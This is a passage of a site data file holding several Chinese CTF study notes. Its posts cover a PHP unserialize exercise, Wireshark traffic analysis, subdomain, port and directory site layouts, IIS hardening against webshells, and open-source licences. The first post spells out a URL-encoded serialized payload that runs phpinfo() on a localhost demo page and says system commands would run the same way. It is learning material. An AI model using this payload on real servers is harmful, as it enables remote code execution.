执行obj\n$obj->run();\n?>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n反序列化题目做题步骤：\n\n 1. 复制源代码到本地\n\n 2. 注释掉和属性无关的内容\n    \n    跟属性相关的只有\n    \n    public $func;\n    public $arg;\n    \n    \n    1\n    2\n    \n\n 3. 根据题目需要，给属性赋值\n    \n    应该会先执行$this->func，所以把func赋值成evil\n    \n    public $func=\"evil\";\n    public $arg=\"phpinfo();\";\n    \n    \n    1\n    2\n    \n\n 4. 生成序列化数据，通常要urlencode\n    \n    $d = new demo;\n    echo urlencode(serialize($d));\n    \n    \n    1\n    2\n    \n\n 5. 传递数据到服务器（攻击目标）\n    \n    使用hackbar传一个get请求\n    \n    http://127.0.0.1:8080/unserialize/demo.php?a=o%3a4%3a%22demo%22%3a2%3a%7bs%3a4%3a%22func%22%3bs%3a4%3a%22evil%22%3bs%3a3%3a%22arg%22%3bs%3a10%3a%22phpinfo%28%29%3b%22%3b%7d\n    \n    \n    1\n    \n    \n    这个请求下应该会执行phpinfo()，所以他应该也会执行其他命令，比如system('ls');''",charsets:{cjk:!0},lastUpdated:"2024/12/19, 21:35:09",lastUpdatedTimestamp:1734615309e3},{title:"20241220CTF学习笔记16",frontmatter:{title:"20241220CTF学习笔记16",date:"2024-12-20T00:00:00.000Z",tags:["CTF","CTFLearn","Misc"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-20-CTFLearn.html",relativePath:"views/numerology/2024-12-20-CTFLearn.md",key:"v-11d61e36",path:"/views/numerology/2024-12-20-CTFLearn.html",headers:[{level:2,title:"工具介绍安装",slug:"工具介绍安装",normalizedTitle:"工具介绍安装",charIndex:43},{level:3,title:"Wireshark【🔗官网】",slug:"wireshark【🔗官网】",normalizedTitle:"wireshark【🔗官网】",charIndex:55}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第32天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">🔗传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"工具介绍安装 Wireshark【🔗官网】",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第32天\n\n\n\n * 工具介绍安装\n   * Wireshark【🔗官网】\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第18章：流量分析基础\n\n 1. 流量取证：抓取犯罪嫌疑人的访问记录，对犯罪嫌疑人进行分析\n 2. 流量分析：在大流量中找到爬虫或者攻击\n\n\n# 工具介绍安装\n\n\n * # Wireshark【🔗官网】\n\n> Wireshark is the world's foremost network protocol analyzer. It lets you see what's happening on your network at a microscopic level. It is the de facto (and often de jure) standard across many industries and educational institutions.\n\n非常全能的工具，比如能抓到蓝牙、TCP、MDNS，如果装了嗅探网卡，甚至可以去抓空中的无线信息，以太网的WPA2，可以拿到本地做密码爆破。\n\n * Tshark\n\n> 在Linux系统或者Ubentu系统中，可以直接用sudo apt install tshark命令安装\n\n相对于Wireshark有一个图像化界面的程序不同，我们如果要导入Python进行后续分析的话，会用到Tshark，完全就是一个命令行的Wirshark\n\n * pyshark\n\n是一个Python包，需要import pyshark",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第32天\n\n\n\n * 工具介绍安装\n   * wireshark【🔗官网】\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第18章：流量分析基础\n\n 1. 流量取证：抓取犯罪嫌疑人的访问记录，对犯罪嫌疑人进行分析\n 2. 流量分析：在大流量中找到爬虫或者攻击\n\n\n# 工具介绍安装\n\n\n * # wireshark【🔗官网】\n\n> wireshark is the world's foremost network protocol analyzer. it lets you see what's happening on your network at a microscopic level. it is the de facto (and often de jure) standard across many industries and educational institutions.\n\n非常全能的工具，比如能抓到蓝牙、tcp、mdns，如果装了嗅探网卡，甚至可以去抓空中的无线信息，以太网的wpa2，可以拿到本地做密码爆破。\n\n * tshark\n\n> 在linux系统或者ubentu系统中，可以直接用sudo apt install tshark命令安装\n\n相对于wireshark有一个图像化界面的程序不同，我们如果要导入python进行后续分析的话，会用到tshark，完全就是一个命令行的wirshark\n\n * pyshark\n\n是一个python包，需要import pyshark",charsets:{cjk:!0},lastUpdated:"2024/12/20, 20:47:24",lastUpdatedTimestamp:1734698844e3},{title:"20241221CTF学习笔记17",frontmatter:{title:"20241221CTF学习笔记17",date:"2024-12-21T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-21-CTFLearn.html",relativePath:"views/numerology/2024-12-21-CTFLearn.md",key:"v-d5f44490",path:"/views/numerology/2024-12-21-CTFLearn.html",headers:[{level:2,title:"常规的Web应用搭建：",slug:"常规的web应用搭建",normalizedTitle:"常规的web应用搭建：",charIndex:167},{level:3,title:"子域名模式",slug:"子域名模式",normalizedTitle:"子域名模式",charIndex:184},{level:3,title:"端口模式",slug:"端口模式",normalizedTitle:"端口模式",charIndex:195},{level:3,title:"目录模式",slug:"目录模式",normalizedTitle:"目录模式",charIndex:205}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第33天</p>\n<p>Web应用&amp;架构搭建&amp;站库分离&amp;路由访问&amp;配置受限&amp;DNS解析</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"常规的Web应用搭建： 子域名模式 端口模式 目录模式",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第33天\n\nWeb应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 常规的Web应用搭建：\n   * 子域名模式\n   * 端口模式\n   * 目录模式\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-Web应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n\n# 常规的Web应用搭建：\n\n 1. 购买云服务器、购买域名\n\n 2. 云服务器搭建中间件\n    \n    比如windows搭建iis服务器，可以网上查看相关教程，这里不做过多演示传送门\n\n 3. 下载并上传Web程序源码\n\n 4. 添加网站并绑定域名\n    \n    我们在阿里云购买域名是根域名xiaosedi.fun，可以往上添加子域名，需要在网站上解析设置\n    \n    \n    \n    这个步骤就是在添加子域名，我们添加了两条子域名后可以通过以下方式访问：\n    \n    www.xiaosedi.com\n    xiaodi.xiaosedi.com\n    \n    \n    1\n    2\n    \n    \n    这里我们看到我们添加了www和xiaodi，如果我们添加的是@，这意思是前面随机，什么都可以。\n    \n    在小迪的视频教程中使用的是Windows Server操作系统，在IIS管理器中添加网站，需要加上主机名也就是刚才的地址www.xiaosedi.com。\n    \n    ps：感觉这个步骤是双向奔赴，网站里需要加上服务器的ip，服务器的IIS管理器中要加上主机名\n    \n    此时我们发现访问xiaodi.xiaosedi.com这个地址的时候，出现的是Windows Server的默认页面\n    \n    **原因：**看刚才一开始的图片，我们在阿里云的域名解析设置里，写的是xiaodi和www，这里如果我们只在网站设置了，没在服务器设置的话，就会访问这个ip地址8.218.70.35，ip访问的话会显示默认页面\n    \n    **解决方案：**我们在服务器上只设置了www.xiaosedi.com这个地址，需要在iis管理器里，右键我们的网站，再绑定一个网站xiaodi.xiaosedi.com绑定才行。\n    \n    做了这个实验，我们需要明白子域名的意思，比如baidu.com就有fanyi.baidu.com或者tieba.baidu.com等\n    \n    >  1. 子域名的定义\n    >     * 子域名是主域名的一个细分部分，位于主域名之前，通过一个点（.）来分隔。以baidu.com为例，fanyi.baidu.com和tieba.baidu.com都是baidu.com的子域名。主域名是一个网站的主要标识，而子域名则可以用于划分网站的不同功能区域或者服务。\n    >  2. 用途和好处\n    >     * 功能划分：子域名可以有效地将网站的不同功能区分开来。比如百度的翻译服务（fanyi.baidu.com）和百度贴吧（tieba.baidu.com）是两个不同的功能模块。通过使用子域名，可以让用户更直观地了解该部分内容的主题，同时也方便网站开发者对不同功能进行独立的管理和维护，包括服务器配置、代码部署和安全策略等。\n    >     * 资源隔离：从技术角度讲，子域名可以帮助实现资源隔离。例如在服务器资源分配上，不同的子域名可以对应不同的服务器或者服务器集群，这样可以根据每个子域名对应的功能或服务的流量、负载等情况，灵活地配置服务器资源，避免一个功能模块的高负载影响到其他模块。在安全方面，也可以针对不同的子域名设置不同的安全策略，如防火墙规则、访问控制等。\n    >     * 品牌拓展和合作：子域名还可以用于品牌拓展或者合作项目。例如，一个公司推出新的产品线或者和其他品牌合作推出联名产品，可以使用新的子域名来推广，这样既能够借助主品牌的知名度，又能够突出新产品或者合作项目的独立性。\n    >  3. 技术实现\n    >     * 域名系统（DNS）配置：在技术层面，子域名的实现依赖于域名系统（DNS）。当用户在浏览器中输入子域名（如fanyi.baidu.com）时，浏览器会向 DNS 服务器发送查询请求。DNS 服务器会根据预先配置的记录来解析这个子域名，找到对应的 IP 地址。这个配置过程通常是由域名所有者（如百度公司）通过域名注册商提供的管理界面或者专业的 DNS 服务来完成。配置记录类型主要包括 A 记录（将域名指向一个 IP 地址）、CNAME 记录（将域名指向另一个域名）等。\n    >     * 服务器设置：在找到子域名对应的 IP 地址后，用户的请求会被发送到对应的服务器。服务器需要根据子域名来识别请求，并返回相应的内容。这通常需要在服务器软件（如 Apache 或 Nginx）中进行配置，设置虚拟主机（Virtual Host）来区分不同子域名的请求，并提供相应的网页或服务内容。例如，对于fanyi.baidu.com的请求，服务器会识别并返回与翻译相关的网页和服务。\n\n\n# 子域名模式\n\nwww.xiaodi8.com zblog asp程序\nxiaodi.xiaodi8.com wordpress php程序\nbbs.xioadi8.com 论坛 dz程序\noa.xiaodi8.com OA 通达OA\n\n\n1\n2\n3\n4\n\n\n试想一下，我们在信息搜集的时候，这两个域名是在同一个域名解析下的，任何一个子域名有安全漏洞，都与这个网站整体相关。\n\n\n# 端口模式\n\n网站默认的端口是80，可加可不加。\n\nwww.xiaodi8.com zblog asp程序\nwww.xiaodi8.com:8080 wordpress php程序\n\n\n1\n2\n\n\n这意味着我们访问不同的端口，访问到的程序不是同一个，这就是我们后边信息搜集为什么要学习端口扫描。\n\n我们看网站不是看他域名是不是相同，在我们的例子中端口不一样，这就意味着是两个目标，我们做渗透测试针对的是程序，所以我们有两个攻击点。\n\n\n# 目录模式\n\nwww.xiaodi8.com zblog asp程序\nwww.xiaodi8.com/bbs 论坛 dz论坛\n\n\n1\n2\n\n\n这又是两套程序，我们把一套源码嵌套到另一套源码里，这其实是两套程序，我们就有了两个目标，任何一套程序出了安全漏洞都会影响到整体安全。",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第33天\n\nweb应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 常规的web应用搭建：\n   * 子域名模式\n   * 端口模式\n   * 目录模式\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-web应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n\n# 常规的web应用搭建：\n\n 1. 购买云服务器、购买域名\n\n 2. 云服务器搭建中间件\n    \n    比如windows搭建iis服务器，可以网上查看相关教程，这里不做过多演示传送门\n\n 3. 下载并上传web程序源码\n\n 4. 添加网站并绑定域名\n    \n    我们在阿里云购买域名是根域名xiaosedi.fun，可以往上添加子域名，需要在网站上解析设置\n    \n    \n    \n    这个步骤就是在添加子域名，我们添加了两条子域名后可以通过以下方式访问：\n    \n    www.xiaosedi.com\n    xiaodi.xiaosedi.com\n    \n    \n    1\n    2\n    \n    \n    这里我们看到我们添加了www和xiaodi，如果我们添加的是@，这意思是前面随机，什么都可以。\n    \n    在小迪的视频教程中使用的是windows server操作系统，在iis管理器中添加网站，需要加上主机名也就是刚才的地址www.xiaosedi.com。\n    \n    ps：感觉这个步骤是双向奔赴，网站里需要加上服务器的ip，服务器的iis管理器中要加上主机名\n    \n    此时我们发现访问xiaodi.xiaosedi.com这个地址的时候，出现的是windows server的默认页面\n    \n    **原因：**看刚才一开始的图片，我们在阿里云的域名解析设置里，写的是xiaodi和www，这里如果我们只在网站设置了，没在服务器设置的话，就会访问这个ip地址8.218.70.35，ip访问的话会显示默认页面\n    \n    **解决方案：**我们在服务器上只设置了www.xiaosedi.com这个地址，需要在iis管理器里，右键我们的网站，再绑定一个网站xiaodi.xiaosedi.com绑定才行。\n    \n    做了这个实验，我们需要明白子域名的意思，比如baidu.com就有fanyi.baidu.com或者tieba.baidu.com等\n    \n    >  1. 子域名的定义\n    >     * 子域名是主域名的一个细分部分，位于主域名之前，通过一个点（.）来分隔。以baidu.com为例，fanyi.baidu.com和tieba.baidu.com都是baidu.com的子域名。主域名是一个网站的主要标识，而子域名则可以用于划分网站的不同功能区域或者服务。\n    >  2. 用途和好处\n    >     * 功能划分：子域名可以有效地将网站的不同功能区分开来。比如百度的翻译服务（fanyi.baidu.com）和百度贴吧（tieba.baidu.com）是两个不同的功能模块。通过使用子域名，可以让用户更直观地了解该部分内容的主题，同时也方便网站开发者对不同功能进行独立的管理和维护，包括服务器配置、代码部署和安全策略等。\n    >     * 资源隔离：从技术角度讲，子域名可以帮助实现资源隔离。例如在服务器资源分配上，不同的子域名可以对应不同的服务器或者服务器集群，这样可以根据每个子域名对应的功能或服务的流量、负载等情况，灵活地配置服务器资源，避免一个功能模块的高负载影响到其他模块。在安全方面，也可以针对不同的子域名设置不同的安全策略，如防火墙规则、访问控制等。\n    >     * 品牌拓展和合作：子域名还可以用于品牌拓展或者合作项目。例如，一个公司推出新的产品线或者和其他品牌合作推出联名产品，可以使用新的子域名来推广，这样既能够借助主品牌的知名度，又能够突出新产品或者合作项目的独立性。\n    >  3. 技术实现\n    >     * 域名系统（dns）配置：在技术层面，子域名的实现依赖于域名系统（dns）。当用户在浏览器中输入子域名（如fanyi.baidu.com）时，浏览器会向 dns 服务器发送查询请求。dns 服务器会根据预先配置的记录来解析这个子域名，找到对应的 ip 地址。这个配置过程通常是由域名所有者（如百度公司）通过域名注册商提供的管理界面或者专业的 dns 服务来完成。配置记录类型主要包括 a 记录（将域名指向一个 ip 地址）、cname 记录（将域名指向另一个域名）等。\n    >     * 服务器设置：在找到子域名对应的 ip 地址后，用户的请求会被发送到对应的服务器。服务器需要根据子域名来识别请求，并返回相应的内容。这通常需要在服务器软件（如 apache 或 nginx）中进行配置，设置虚拟主机（virtual host）来区分不同子域名的请求，并提供相应的网页或服务内容。例如，对于fanyi.baidu.com的请求，服务器会识别并返回与翻译相关的网页和服务。\n\n\n# 子域名模式\n\nwww.xiaodi8.com zblog asp程序\nxiaodi.xiaodi8.com wordpress php程序\nbbs.xioadi8.com 论坛 dz程序\noa.xiaodi8.com oa 通达oa\n\n\n1\n2\n3\n4\n\n\n试想一下，我们在信息搜集的时候，这两个域名是在同一个域名解析下的，任何一个子域名有安全漏洞，都与这个网站整体相关。\n\n\n# 端口模式\n\n网站默认的端口是80，可加可不加。\n\nwww.xiaodi8.com zblog asp程序\nwww.xiaodi8.com:8080 wordpress php程序\n\n\n1\n2\n\n\n这意味着我们访问不同的端口，访问到的程序不是同一个，这就是我们后边信息搜集为什么要学习端口扫描。\n\n我们看网站不是看他域名是不是相同，在我们的例子中端口不一样，这就意味着是两个目标，我们做渗透测试针对的是程序，所以我们有两个攻击点。\n\n\n# 目录模式\n\nwww.xiaodi8.com zblog asp程序\nwww.xiaodi8.com/bbs 论坛 dz论坛\n\n\n1\n2\n\n\n这又是两套程序，我们把一套源码嵌套到另一套源码里，这其实是两套程序，我们就有了两个目标，任何一套程序出了安全漏洞都会影响到整体安全。",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"2024123CTF学习笔记20",frontmatter:{title:"2024123CTF学习笔记20",date:"2024-12-23T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-23-CTFLearn.html",relativePath:"views/numerology/2024-12-23-CTFLearn.md",key:"v-c9354688",path:"/views/numerology/2024-12-23-CTFLearn.html",headers:[{level:2,title:"攻防转换：",slug:"攻防转换",normalizedTitle:"攻防转换：",charIndex:167},{level:3,title:"1.锁定目录：",slug:"_1-锁定目录",normalizedTitle:"1.锁定目录：",charIndex:178},{level:3,title:"2.身份验证",slug:"_2-身份验证",normalizedTitle:"2.身份验证",charIndex:191},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:203}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第35天</p>\n<p>Web应用&amp;架构搭建&amp;站库分离&amp;路由访问&amp;配置受限&amp;DNS解析</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"攻防转换： 1.锁定目录： 2.身份验证 总结",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第35天\n\nWeb应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 攻防转换：\n   * 1.锁定目录：\n   * 2.身份验证\n   * 总结\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-Web应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n\n# 攻防转换：\n\n\n# 1.锁定目录：\n\n从攻击者角度，如果我们拿到了网站权限，在目录下放了一个后门，我们可以用WebShell工具连接后门到服务器。\n\n从防守方角度，如果我们在IIS管理器中，右键我们需要保护的目录，比如视频中举得例子是post目录，将目录的Everyone的权限改为拒绝，就能组织WebShell的访问。\n\n\n\n但通过以上方式修改后，访问该目录下的地址，发现返回401未授权。\n\n通过以上实验，我们需要明确这里的Everyone权限下的几种权限边界完全控制、修改、读取和执行、列出文件夹内容、读取、写入，如果我们不给执行权限，脚本就运行不起来，网站也就打不开。\n\n**问：**我们把目录都这样设置行不行？\n\n**答：**当然不行，我们可以对图片目录等做这样的锁定设置，图片依然能正常读取。但对其他目录不行，不能这样设置，否则会导致页面无法展示。\n\n\n# 2.身份验证\n\n我们在身份验证中，启用Windows身份验证，禁用匿名验证\n\n\n\n示例中用的是blog目录，我们在网站中访问该目录，显示需要账号密码才能登录。\n\n\n\n\n# 总结\n\n综上，我们有多种方式配置都能影响到我们对该网站的安全渗透，上述几个设置案例是教给大家这样的结果出现是怎么出现的，这些方法对我们安全测试来有极大影响，只能去找其他的办法。",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第35天\n\nweb应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 攻防转换：\n   * 1.锁定目录：\n   * 2.身份验证\n   * 总结\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-web应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n\n# 攻防转换：\n\n\n# 1.锁定目录：\n\n从攻击者角度，如果我们拿到了网站权限，在目录下放了一个后门，我们可以用webshell工具连接后门到服务器。\n\n从防守方角度，如果我们在iis管理器中，右键我们需要保护的目录，比如视频中举得例子是post目录，将目录的everyone的权限改为拒绝，就能组织webshell的访问。\n\n\n\n但通过以上方式修改后，访问该目录下的地址，发现返回401未授权。\n\n通过以上实验，我们需要明确这里的everyone权限下的几种权限边界完全控制、修改、读取和执行、列出文件夹内容、读取、写入，如果我们不给执行权限，脚本就运行不起来，网站也就打不开。\n\n**问：**我们把目录都这样设置行不行？\n\n**答：**当然不行，我们可以对图片目录等做这样的锁定设置，图片依然能正常读取。但对其他目录不行，不能这样设置，否则会导致页面无法展示。\n\n\n# 2.身份验证\n\n我们在身份验证中，启用windows身份验证，禁用匿名验证\n\n\n\n示例中用的是blog目录，我们在网站中访问该目录，显示需要账号密码才能登录。\n\n\n\n\n# 总结\n\n综上，我们有多种方式配置都能影响到我们对该网站的安全渗透，上述几个设置案例是教给大家这样的结果出现是怎么出现的，这些方法对我们安全测试来有极大影响，只能去找其他的办法。",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20241222CTF学习笔记18",frontmatter:{title:"20241222CTF学习笔记18",date:"2024-12-22T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-22-CTFLearn.html",relativePath:"views/numerology/2024-12-22-CTFLearn.md",key:"v-18359d3a",path:"/views/numerology/2024-12-22-CTFLearn.html",headers:[{level:2,title:"其他的Web应用搭建：",slug:"其他的web应用搭建",normalizedTitle:"其他的web应用搭建：",charIndex:167},{level:3,title:"网站应用场景造成源码分类",slug:"网站应用场景造成源码分类",normalizedTitle:"网站应用场景造成源码分类",charIndex:184},{level:3,title:"GPL 协议",slug:"gpl-协议",normalizedTitle:"gpl 协议",charIndex:202},{level:3,title:"LGPL 协议",slug:"lgpl-协议",normalizedTitle:"lgpl 协议",charIndex:214},{level:3,title:"BSD 协议",slug:"bsd-协议",normalizedTitle:"bsd 协议",charIndex:227},{level:3,title:"Apache 协议",slug:"apache-协议",normalizedTitle:"apache 协议",charIndex:239},{level:3,title:"MPL 协议",slug:"mpl-协议",normalizedTitle:"mpl 协议",charIndex:254},{level:3,title:"MIT 协议",slug:"mit-协议",normalizedTitle:"mit 协议",charIndex:266}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第34天</p>\n<p>Web应用&amp;架构搭建&amp;站库分离&amp;路由访问&amp;配置受限&amp;DNS解析</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"其他的Web应用搭建： 网站应用场景造成源码分类 GPL 协议 LGPL 协议 BSD 协议 Apache 协议 MPL 协议 MIT 协议",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第34天\n\nWeb应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 其他的Web应用搭建：\n   * 网站应用场景造成源码分类\n   * GPL 协议\n   * LGPL 协议\n   * BSD 协议\n   * Apache 协议\n   * MPL 协议\n   * MIT 协议\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-Web应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n\n# 其他的Web应用搭建：\n\n比如： 集成软件 & Docker容器 & 分配站 等\n\n**集成软件：**正常我们都是一点点安装，但网上有些一站式安装的面板比如宝塔、phpStudy等，环境都集成到一个软件里，对比我们常规的逐步搭建，这种方式不利于我们学习，但快速便捷。\n\n**分配站：**举个例子，我们用的cnblog，也就是博客园，如果注册了账号，他会给你一个域名，在这个域名上做我们的应用，这是我们和别人共用的一个大域名，这就是分配站。如果这样的分配站是我们的渗透目标，我们面对的就不是单个的，是面对的一个整体。\n\n**Docker容器：**Docker 容器是一种轻量级、可移植、自包含的软件打包和运行环境。它将软件及其依赖项（如库、配置文件等）打包成一个独立的单元，使得软件可以在任何支持 Docker 的环境中一致地运行。可以把容器想象成一个小型的、隔离的操作系统环境，里面包含了运行特定应用程序所需的一切。相对来说优点是环境隔离。\n\n\n# 网站应用场景造成源码分类\n\n * **开源：**就是网站可以下载到本地，用了开源协议的共享式网站\n   1. 开源且源码可见\n   2. 开源但源码不可见-加密：比如PHP代码加密、ASP代码加密，加密后不会影响本身执行。\n   3. 开源但源码不可见-语言特性决定：像Java在编译后是class文件\n * **闭源（商业）：**需要购买的，公司的产品\n * **自写：**比如自己的博客\n\n有些源码可下载，但看不到是什么东西，如果能看到代码就是白盒测试、也就是代码审计，而碰到了加密或者是语言特性决定源码不可见的情况，就比如.Net的代码就要进行反编译。\n\n大型企业基本不会用开源的代码，安全性太低。或者商业的代码，不需要找别人开发。\n\n> 以下是一些常用的开源协议：\n> \n> \n>  * # GPL 协议\n>    \n>    * 简介：由自由软件基金会制定，旨在保证软件的开源性和用户的自由。有 GPL2.0 和 GPL3.0 等版本，GPL3.0 在用户专利保护和 DRM 限制等方面有所更新.\n>    * 特点：使用该协议的软件，其源代码及衍生作品都必须开源，并以相同协议发布。允许用户自由运行、复制、修改和分发软件，但不允许将开源软件私有化用于商业发售.\n>    \n>    \n>    # LGPL 协议\n>    \n>    * 简介：是 GPL 的变种，主要用于类库，被商业软件开发商广泛支持.\n>    * 特点：允许商业软件通过类库引用方式使用 LGPL 类库而无需开源商业软件代码，但如果修改了 LGPL 协议的代码，修改后的代码仍需开源.\n>    \n>    \n>    # BSD 协议\n>    \n>    * 简介：分为 BSD 2-Clause 和 BSD 3-Clause 两种，给予使用者很大自由.\n>    * 特点：使用者可自由使用、修改和再发布代码，无论是开源还是专有软件均可。发布时，若包含源代码需带原 BSD 协议，若仅发布二进制类库 / 软件，则需在文档和版权声明中包含原协议，且不可用作者 / 机构名字和原产品名做市场推广.\n>    \n>    \n>    # Apache 协议\n>    \n>    * 简介：著名的非盈利开源组织 Apache 采用的协议，和 BSD 类似，对商业应用友好.\n>    * 特点：允许使用者修改和再发布代码作为开源或商业产品，使用时需给用户一份协议，修改代码要在被修改文件中说明，延伸代码中需带有原协议等声明，若发布产品包含 Notice 文件，其中也要带有该协议.\n>    \n>    \n>    # MPL 协议\n>    \n>    * 简介：最初由 Netscape 的 Mozilla 小组设计，平衡了开发者对源代码的需求和利益.\n>    * 特点：要求对经 MPL 许可证发布的源代码的修改以 MPL 许可证方式再许可，但允许企业在已有源代码库上加接口，接口程序源代码以 MPL 许可证对外许可，库中其他源代码则无需强制对外许可.\n>    \n>    \n>    # MIT 协议\n>    \n>    * 简介：是一种非常宽松的许可协议，作者仅保留版权.\n>    * 特点：允许任何人进行个人或商业使用、复制、分发和修改，唯一要求是在发行版中包含原许可协议声明",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第34天\n\nweb应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 其他的web应用搭建：\n   * 网站应用场景造成源码分类\n   * gpl 协议\n   * lgpl 协议\n   * bsd 协议\n   * apache 协议\n   * mpl 协议\n   * mit 协议\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-web应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n\n# 其他的web应用搭建：\n\n比如： 集成软件 & docker容器 & 分配站 等\n\n**集成软件：**正常我们都是一点点安装，但网上有些一站式安装的面板比如宝塔、phpstudy等，环境都集成到一个软件里，对比我们常规的逐步搭建，这种方式不利于我们学习，但快速便捷。\n\n**分配站：**举个例子，我们用的cnblog，也就是博客园，如果注册了账号，他会给你一个域名，在这个域名上做我们的应用，这是我们和别人共用的一个大域名，这就是分配站。如果这样的分配站是我们的渗透目标，我们面对的就不是单个的，是面对的一个整体。\n\n**docker容器：**docker 容器是一种轻量级、可移植、自包含的软件打包和运行环境。它将软件及其依赖项（如库、配置文件等）打包成一个独立的单元，使得软件可以在任何支持 docker 的环境中一致地运行。可以把容器想象成一个小型的、隔离的操作系统环境，里面包含了运行特定应用程序所需的一切。相对来说优点是环境隔离。\n\n\n# 网站应用场景造成源码分类\n\n * **开源：**就是网站可以下载到本地，用了开源协议的共享式网站\n   1. 开源且源码可见\n   2. 开源但源码不可见-加密：比如php代码加密、asp代码加密，加密后不会影响本身执行。\n   3. 开源但源码不可见-语言特性决定：像java在编译后是class文件\n * **闭源（商业）：**需要购买的，公司的产品\n * 